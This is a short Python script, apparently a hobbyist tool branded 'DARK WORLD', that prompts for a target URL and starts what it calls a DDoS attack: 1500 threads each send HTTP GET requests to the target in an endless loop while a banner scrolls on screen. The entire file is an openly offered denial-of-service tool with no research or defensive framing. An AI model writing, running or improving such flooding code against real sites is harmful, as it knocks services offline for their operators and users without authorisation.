import requests
import threading
import time

# Function to send HTTP requests
def send_request(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Sent request to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

# Function to animate the banner
def animate_banner():
    banner_text = "DARK WORLD"
    banner_length = len(banner_text)

    # Animate the banner
    while True:
        for i in range(banner_length):
            print("\r" + banner_text[i:] + banner_text[:i], end="")
            time.sleep(0.5)

# Main function
def main():
    # Start the banner animation in a separate thread after 1 second
    banner_thread = threading.Timer(1, animate_banner)
    banner_thread.start()

    # Display creator information
    print("Creator: Rahad Hasan")

    # Get the target URL from the user
    target_url = input("Enter the target URL: ")

    # Start the DDoS attack
    print("Starting DDoS attack...")
    for _ in range(1500):
        # Create a new thread for each request
        thread = threading.Thread(target=send_request, args=(target_url,))
        thread.start()

# Run the script when executed as the main program
if __name__ == "__main__":
    main()
